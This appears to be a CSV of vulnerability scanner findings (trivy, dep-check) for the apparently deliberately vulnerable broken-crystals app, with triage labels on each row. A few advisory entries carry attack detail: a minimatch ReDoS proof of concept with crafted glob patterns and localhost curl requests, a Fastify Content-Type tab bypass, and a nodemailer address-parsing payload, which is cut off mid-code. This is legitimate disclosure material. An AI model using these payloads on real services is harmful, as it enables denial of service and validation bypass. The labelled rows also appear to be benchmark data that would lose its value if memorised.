GRP-broken-crystals-CWE-400-505,dep-check,broken-crystals,CWE-400,low,brace-expansion:1.1.11,"A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.",TP,medium,yes,1
GRP-broken-crystals-CWE-400-506,dep-check,broken-crystals,CWE-400,high,libxmljs:1.0.11,"A vulnerability exists in the libxmljs 1.0.11 when parsing a specially crafted XML document. Accessing the internal _ref property on entity_ref and entity_decl nodes causes a segmentation fault, potentially leading to a denial-of-service (DoS).",TP,medium,yes,1
GRP-broken-crystals-CWE-400-507,trivy,broken-crystals,CWE-400,high,libexpat1@2.2.6-2+deb10u6,expat: parsing large tokens can trigger a denial of service,TP,medium,yes,1
GRP-broken-crystals-CWE-400-508,trivy,broken-crystals,CWE-400,high,libexpat1-dev@2.2.6-2+deb10u6,expat: parsing large tokens can trigger a denial of service,TP,medium,yes,1
GRP-broken-crystals-CWE-400-509,trivy,broken-crystals,CWE-400,high,libglib2.0-0@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-510,trivy,broken-crystals,CWE-400,high,libglib2.0-bin@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-511,trivy,broken-crystals,CWE-400,high,libglib2.0-data@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-512,trivy,broken-crystals,CWE-400,high,libglib2.0-dev@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-513,trivy,broken-crystals,CWE-400,high,libglib2.0-dev-bin@2.58.3-2+deb10u4,glib: GVariant offset table entry size is not checked in is_normal(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-514,trivy,broken-crystals,CWE-400,high,libnghttp2-14@1.36.0-2+deb10u1,HTTP/2: Multiple HTTP/2 enabled web servers are vulnerable to a DDoS attack (Rapid Reset Attack),TP,medium,yes,1
GRP-broken-crystals-CWE-400-515,trivy,broken-crystals,CWE-400,medium,libpq-dev@11.19-0+deb10u1,postgresql: Role pg_signal_backend can signal certain superuser processes.,TP,medium,yes,1
GRP-broken-crystals-CWE-400-516,trivy,broken-crystals,CWE-400,medium,libpq5@11.19-0+deb10u1,postgresql: Role pg_signal_backend can signal certain superuser processes.,TP,medium,yes,1
GRP-broken-crystals-CWE-400-517,trivy,broken-crystals,CWE-400,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-518,trivy,broken-crystals,CWE-400,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-519,trivy,broken-crystals,CWE-400,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-520,trivy,broken-crystals,CWE-400,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-521,trivy,broken-crystals,CWE-400,high,libsystemd0@241-7~deb10u9,bind9: Preparing an NSEC3 closest encloser proof can exhaust CPU resources,TP,medium,yes,1
GRP-broken-crystals-CWE-400-522,trivy,broken-crystals,CWE-400,medium,libtiff-dev@4.1.0+git191117-2~deb10u7,libtiff: Out-of-memory in TIFFOpen via a craft file,TP,medium,yes,1
GRP-broken-crystals-CWE-400-523,trivy,broken-crystals,CWE-400,medium,libtiff5@4.1.0+git191117-2~deb10u7,libtiff: Out-of-memory in TIFFOpen via a craft file,TP,medium,yes,1
GRP-broken-crystals-CWE-400-524,trivy,broken-crystals,CWE-400,medium,libtiffxx5@4.1.0+git191117-2~deb10u7,libtiff: Out-of-memory in TIFFOpen via a craft file,TP,medium,yes,1
GRP-broken-crystals-CWE-400-525,trivy,broken-crystals,CWE-400,high,libudev1@241-7~deb10u9,bind9: Preparing an NSEC3 closest encloser proof can exhaust CPU resources,TP,medium,yes,1
GRP-broken-crystals-CWE-400-526,trivy,broken-crystals,CWE-400,high,libunbound8@1.9.0-2+deb10u3,bind9: Preparing an NSEC3 closest encloser proof can exhaust CPU resources,TP,medium,yes,1
GRP-broken-crystals-CWE-400-527,trivy,broken-crystals,CWE-400,medium,libx11-6@2:1.6.7-1+deb10u2,libX11: stack exhaustion from infinite recursion in PutSubImage(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-528,trivy,broken-crystals,CWE-400,medium,libx11-data@2:1.6.7-1+deb10u2,libX11: stack exhaustion from infinite recursion in PutSubImage(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-529,trivy,broken-crystals,CWE-400,medium,libx11-dev@2:1.6.7-1+deb10u2,libX11: stack exhaustion from infinite recursion in PutSubImage(),TP,medium,yes,1
GRP-broken-crystals-CWE-400-530,trivy,broken-crystals,CWE-400,high,linux-libc-dev@4.19.269-1,kernel: ICMPv6 “Packet Too Big” packets force a DoS of the Linux kernel by forcing 100% CPU,TP,medium,yes,1
GRP-broken-crystals-CWE-400-531,trivy,broken-crystals,CWE-400,medium,python2.7@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-532,trivy,broken-crystals,CWE-400,medium,python2.7-minimal@2.7.16-2+deb10u1,python: wrong backtracking in urllib.request.AbstractBasicAuthHandler allows for a ReDoS,TP,medium,yes,1
GRP-broken-crystals-CWE-400-533,trivy,broken-crystals,CWE-400,medium,python3.7@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-534,trivy,broken-crystals,CWE-400,medium,python3.7-minimal@3.7.3-2+deb10u4,python: urllib: Regular expression DoS in AbstractBasicAuthHandler,TP,medium,yes,1
GRP-broken-crystals-CWE-400-535,trivy,broken-crystals,CWE-400,low,brace-expansion@1.1.11,brace-expansion: juliangruber brace-expansion index.js expand redos,TP,medium,yes,1
GRP-broken-crystals-CWE-400-536,trivy,broken-crystals,CWE-400,low,brace-expansion@2.0.1,brace-expansion: juliangruber brace-expansion index.js expand redos,TP,medium,yes,1
GRP-broken-crystals-CWE-400-537,trivy,broken-crystals,CWE-400,medium,graphql@16.6.0,graphql: Insufficient checks in the OverlappingFieldsCanBeMergedRule.ts file when parsing large queries,TP,medium,yes,1
GRP-broken-crystals-CWE-400-538,trivy,broken-crystals,CWE-400,medium,jose@4.13.1,jose: resource exhaustion,TP,medium,yes,1
GRP-broken-crystals-CWE-400-539,trivy,broken-crystals,CWE-400,high,libxmljs@0.19.7,"libxmljs has segmentation fault, potentially leading to a denial-of-service (DoS)",TP,medium,yes,1
GRP-broken-crystals-CWE-400-540,trivy,broken-crystals,CWE-400,medium,tar@4.4.19,node-tar: denial of service while parsing a tar file due to lack of folders depth validation,TP,medium,yes,1
GRP-broken-crystals-CWE-400-541,trivy,broken-crystals,CWE-400,medium,tar@6.1.13,node-tar: denial of service while parsing a tar file due to lack of folders depth validation,TP,medium,yes,1
GRP-broken-crystals-CWE-401-542,dep-check,broken-crystals,CWE-401,low,undici:5.28.4,"### Impact Applications that use undici to implement a webhook-like system are vulnerable. If the attacker set up a server with an invalid certificate, and they can force the application to call the webhook repeatedly, then they can cause a memory leak. ### Patches This has been patched in https://github.com/nodejs/undici/pull/4088. ### Workarounds If a webhook fails, avoid keep calling it repeatedly. ### References Reported as: https://github.com/nodejs/undici/issues/3895",pending,low,no,1
GRP-broken-crystals-CWE-401-543,trivy,broken-crystals,CWE-401,high,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-544,trivy,broken-crystals,CWE-401,high,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-545,trivy,broken-crystals,CWE-401,high,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-546,trivy,broken-crystals,CWE-401,high,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-547,trivy,broken-crystals,CWE-401,high,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-548,trivy,broken-crystals,CWE-401,high,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-549,trivy,broken-crystals,CWE-401,high,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-550,trivy,broken-crystals,CWE-401,high,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-551,trivy,broken-crystals,CWE-401,high,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-552,trivy,broken-crystals,CWE-401,high,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-553,trivy,broken-crystals,CWE-401,high,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-554,trivy,broken-crystals,CWE-401,high,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-555,trivy,broken-crystals,CWE-401,high,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: memory leak in identify -help,pending,low,no,1
GRP-broken-crystals-CWE-401-556,trivy,broken-crystals,CWE-401,medium,linux-libc-dev@4.19.269-1,kernel: sctp: fail if no bound addresses can be used for a given scope,pending,low,no,1
GRP-broken-crystals-CWE-401-557,trivy,broken-crystals,CWE-401,low,undici@5.21.0,undici: Undici Memory Leak with Invalid Certificates,pending,low,no,1
GRP-broken-crystals-CWE-405-558,trivy,broken-crystals,CWE-405,medium,libpython2.7-minimal@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-559,trivy,broken-crystals,CWE-405,medium,libpython2.7-stdlib@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-560,trivy,broken-crystals,CWE-405,medium,libpython3.7-minimal@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-561,trivy,broken-crystals,CWE-405,medium,libpython3.7-stdlib@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-562,trivy,broken-crystals,CWE-405,medium,python2.7@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-563,trivy,broken-crystals,CWE-405,medium,python2.7-minimal@2.7.16-2+deb10u1,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-564,trivy,broken-crystals,CWE-405,medium,python3.7@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-405-565,trivy,broken-crystals,CWE-405,medium,python3.7-minimal@3.7.3-2+deb10u4,python: The zipfile module is vulnerable to zip-bombs leading to denial of service,pending,low,no,1
GRP-broken-crystals-CWE-407-566,dep-check,broken-crystals,CWE-407,high,minimatch:3.1.2,"### Summary `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. --- ### Details The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960): ```typescript while (fr < fl) { .. if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) { .. return true } .. fr++ } ``` When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k). There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input. Measured timing with n=30 path segments: | k (globstars) | Pattern size | Time | |---------------|--------------|----------| | 7 | 36 bytes | ~154ms | | 9 | 46 bytes | ~1.2s | | 11 | 56 bytes | ~5.4s | | 12 | 61 bytes | ~9.7s | | 13 | 66 bytes | ~15.9s | --- ### PoC Tested on minimatch@10.2.2, Node.js 20. **Step 1 -- inline script** ```javascript import { minimatch } from 'minimatch' // k=9 globstars, n=30 path segments // pattern: 46 bytes, default options const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b' const path = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a' const start = Date.now() minimatch(path, pattern) console.log(Date.now() - start + 'ms') // ~1200ms ``` To scale the effect, increase k: ```javascript // k=11 -> ~5.4s, k=13 -> ~15.9s const k = 11 const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b' const path = Array(30).fill('a').join('/') minimatch(path, pattern) ``` No special options are required. This reproduces with the default `minimatch()` call. **Step 2 -- HTTP server (event loop starvation proof)** The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common: ```javascript // poc1-server.mjs import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch' const PORT = 3000 const server = http.createServer((req, res) => { const url = new URL(req.url, `http://localhost:${PORT}`) if (url.pathname !== '/match') { res.writeHead(404); res.end(); return } const pattern = url.searchParams.get('pattern') ?? '' const path = url.searchParams.get('path') ?? '' const start = process.hrtime.bigint() const result = minimatch(path, pattern) const ms = Number(process.hrtime.bigint() - start) / 1e6 res.writeHead(200, { 'Content-Type': 'application/json' }) res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n') }) server.listen(PORT) ``` Terminal 1 -- start the server: ``` node poc1-server.mjs ``` Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell: ``` curl ""http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa"" & ``` Terminal 3 -- while the attack is in-flight, send a benign request: ``` curl -w ""\ntime_total: %{time_total}s\n"" ""http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"" ``` **Observed output (Terminal 3):** ``` {""result"":true,""ms"":""0""} time_total: 4.132709s ``` The server reports `""ms"":""0""` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline: ``` {""result"":true,""ms"":""0""} time_total: 0.001599s ``` --- ### Impact Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",pending,low,no,1
GRP-broken-crystals-CWE-407-567,trivy,broken-crystals,CWE-407,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-568,trivy,broken-crystals,CWE-407,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-569,trivy,broken-crystals,CWE-407,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-570,trivy,broken-crystals,CWE-407,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-571,trivy,broken-crystals,CWE-407,high,python2.7@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-572,trivy,broken-crystals,CWE-407,high,python2.7-minimal@2.7.16-2+deb10u1,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-573,trivy,broken-crystals,CWE-407,high,python3.7@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-574,trivy,broken-crystals,CWE-407,high,python3.7-minimal@3.7.3-2+deb10u4,python: CPU denial of service via inefficient IDNA decoder,pending,low,no,1
GRP-broken-crystals-CWE-407-575,trivy,broken-crystals,CWE-407,high,minimatch@3.1.2,minimatch: minimatch: Denial of Service due to unbounded recursive backtracking via crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-407-576,trivy,broken-crystals,CWE-407,high,minimatch@5.1.6,minimatch: minimatch: Denial of Service due to unbounded recursive backtracking via crafted glob patterns,pending,low,no,1
GRP-broken-crystals-CWE-413-577,trivy,broken-crystals,CWE-413,medium,linux-libc-dev@4.19.269-1,kernel: A possible deadlock in dm_get_inactive_table in dm- ioctl.c leads to dos,pending,low,no,1
GRP-broken-crystals-CWE-415-578,trivy,broken-crystals,CWE-415,medium,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: Hashing of empty dict strings isn't deterministic,pending,low,no,1
GRP-broken-crystals-CWE-415-579,trivy,broken-crystals,CWE-415,medium,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: Hashing of empty dict strings isn't deterministic,pending,low,no,1
GRP-broken-crystals-CWE-415-580,trivy,broken-crystals,CWE-415,high,linux-libc-dev@4.19.269-1,kernel: tun: avoid double free in tun_free_netdev,pending,low,no,1
GRP-broken-crystals-CWE-416-581,trivy,broken-crystals,CWE-416,medium,imagemagick@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-582,trivy,broken-crystals,CWE-416,medium,imagemagick-6-common@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-583,trivy,broken-crystals,CWE-416,medium,imagemagick-6.q16@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-584,trivy,broken-crystals,CWE-416,medium,iproute2@4.20.0-2+deb10u1,iproute: use-after-free in get_netnsid_from_name in ip/ipnetns.c,pending,low,no,1
GRP-broken-crystals-CWE-416-585,trivy,broken-crystals,CWE-416,medium,libc-bin@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-586,trivy,broken-crystals,CWE-416,medium,libc-dev-bin@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-587,trivy,broken-crystals,CWE-416,medium,libc6@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-588,trivy,broken-crystals,CWE-416,medium,libc6-dev@2.28-10+deb10u2,glibc: potential use-after-free in getaddrinfo(),pending,low,no,1
GRP-broken-crystals-CWE-416-589,trivy,broken-crystals,CWE-416,medium,libmagickcore-6-arch-config@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-590,trivy,broken-crystals,CWE-416,medium,libmagickcore-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-591,trivy,broken-crystals,CWE-416,medium,libmagickcore-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-592,trivy,broken-crystals,CWE-416,medium,libmagickcore-6.q16-6-extra@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-593,trivy,broken-crystals,CWE-416,medium,libmagickcore-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-594,trivy,broken-crystals,CWE-416,medium,libmagickcore-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-595,trivy,broken-crystals,CWE-416,medium,libmagickwand-6-headers@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-596,trivy,broken-crystals,CWE-416,medium,libmagickwand-6.q16-6@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-597,trivy,broken-crystals,CWE-416,medium,libmagickwand-6.q16-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-598,trivy,broken-crystals,CWE-416,medium,libmagickwand-dev@8:6.9.10.23+dfsg-2.1+deb10u4,ImageMagick: Heap use-after-free in coders/bmp.c,pending,low,no,1
GRP-broken-crystals-CWE-416-599,trivy,broken-crystals,CWE-416,high,libpython2.7-minimal@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-600,trivy,broken-crystals,CWE-416,high,libpython2.7-stdlib@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-601,trivy,broken-crystals,CWE-416,high,libpython3.7-minimal@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-602,trivy,broken-crystals,CWE-416,high,libpython3.7-stdlib@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-603,trivy,broken-crystals,CWE-416,low,libsepol1@2.8-1,libsepol: use-after-free in __cil_verify_classperms(),pending,low,no,1
GRP-broken-crystals-CWE-416-604,trivy,broken-crystals,CWE-416,low,libsepol1-dev@2.8-1,libsepol: use-after-free in __cil_verify_classperms(),pending,low,no,1
GRP-broken-crystals-CWE-416-605,trivy,broken-crystals,CWE-416,medium,libssl-dev@1.1.1n-0+deb10u4,openssl: Use After Free with SSL_free_buffers,pending,low,no,1
GRP-broken-crystals-CWE-416-606,trivy,broken-crystals,CWE-416,medium,libssl1.1@1.1.1n-0+deb10u4,openssl: Use After Free with SSL_free_buffers,pending,low,no,1
GRP-broken-crystals-CWE-416-607,trivy,broken-crystals,CWE-416,high,libwebp-dev@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-608,trivy,broken-crystals,CWE-416,high,libwebp6@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-609,trivy,broken-crystals,CWE-416,high,libwebpdemux2@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-610,trivy,broken-crystals,CWE-416,high,libwebpmux3@0.6.1-2+deb10u1,Mozilla: libwebp: Double-free in libwebp,pending,low,no,1
GRP-broken-crystals-CWE-416-611,trivy,broken-crystals,CWE-416,high,libxml2@2.9.4+dfsg1-7+deb10u5,libxml2: use-after-free in XMLReader,pending,low,no,1
GRP-broken-crystals-CWE-416-612,trivy,broken-crystals,CWE-416,high,libxml2-dev@2.9.4+dfsg1-7+deb10u5,libxml2: use-after-free in XMLReader,pending,low,no,1
GRP-broken-crystals-CWE-416-613,trivy,broken-crystals,CWE-416,high,linux-libc-dev@4.19.269-1,kernel: Use after Free in gru_set_context_option leading to kernel panic,pending,low,no,1
GRP-broken-crystals-CWE-416-614,trivy,broken-crystals,CWE-416,medium,openssl@1.1.1n-0+deb10u4,openssl: Use After Free with SSL_free_buffers,pending,low,no,1
GRP-broken-crystals-CWE-416-615,trivy,broken-crystals,CWE-416,high,python2.7@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-616,trivy,broken-crystals,CWE-416,high,python2.7-minimal@2.7.16-2+deb10u1,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-617,trivy,broken-crystals,CWE-416,high,python3.7@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-416-618,trivy,broken-crystals,CWE-416,high,python3.7-minimal@3.7.3-2+deb10u4,python: use after free in heappushpop() of heapq module,pending,low,no,1
GRP-broken-crystals-CWE-428-619,trivy,broken-crystals,CWE-428,critical,openssh-client@1:7.9p1-10+deb10u2,openssh: Remote code execution in ssh-agent PKCS#11 support,pending,low,no,1
GRP-broken-crystals-CWE-436-620,dep-check,broken-crystals,CWE-436,high,fastify:4.28.1,"### Impact A validation bypass vulnerability exists in Fastify where request body validation schemas specified by Content-Type can be completely circumvented. By appending a tab character (`\t`) followed by arbitrary content to the Content-Type header, attackers can bypass body validation while the server still processes the body as the original content type. For example, a request with `Content-Type: application/json\ta` will bypass JSON schema validation but still be parsed as JSON. This vulnerability affects all Fastify users who rely on Content-Type-based body validation schemas to enforce data integrity or security constraints. The concrete impact depends on the handler implementation and the level of trust placed in the validated request body, but at the library level, this allows complete bypass of body validation for any handler using Content-Type-discriminated schemas. This issue is a regression or missed edge case from the fix for a previously reported vulnerability. ### Patches This vulnerability has been patched in **Fastify v5.7.2**. All users should upgrade to this version or later immediately. ### Workarounds If upgrading is not immediately possible, user can implement a custom `onRequest` hook to reject requests containing tab characters in the Content-Type header: ```javascript fastify.addHook('onRequest', async (request, reply) => { const contentType = request.headers['content-type'] if (contentType && contentType.includes('\t')) { reply.code(400).send({ error: 'Invalid Content-Type header' }) } }) ``` ### Resources - https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272 - https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125 - [Fastify Validation and Serialization Documentation](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/) - https://hackerone.com/reports/3464114",TP,medium,yes,1
GRP-broken-crystals-CWE-436-621,dep-check,broken-crystals,CWE-436,info,nodemailer:6.9.15,"The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target. Payload: `""xclow3n@gmail.com x""@internal.domain` Using the following code to send mail ``` const nodemailer = require(""nodemailer""); let transporter = nodemailer.createTransport({ service: ""gmail"", auth: { user: """", pass: """", }, }); let mailOptions = { from: '""Test Sender"" <your_email@gmail.com>', to: ""\""xclow3n@gmail.com x\""@internal.domain"", subject: ""Hello from Nodemailer"", text: ""This is a test email sent using Gmail SMTP and Nodemailer!"", }; transporter.sendMail(mailOptions, (error, info) => { if (error) { return console.log(""Error: "", error); } console.log(""Message sent: %s"", info.messageId); }); (async () => { const parser = await import(""@sparser/email-address-parser""); const { EmailAddress, ParsingOptions } = parser.default; const parsed = EmailAddress.parse(mailOptions.to 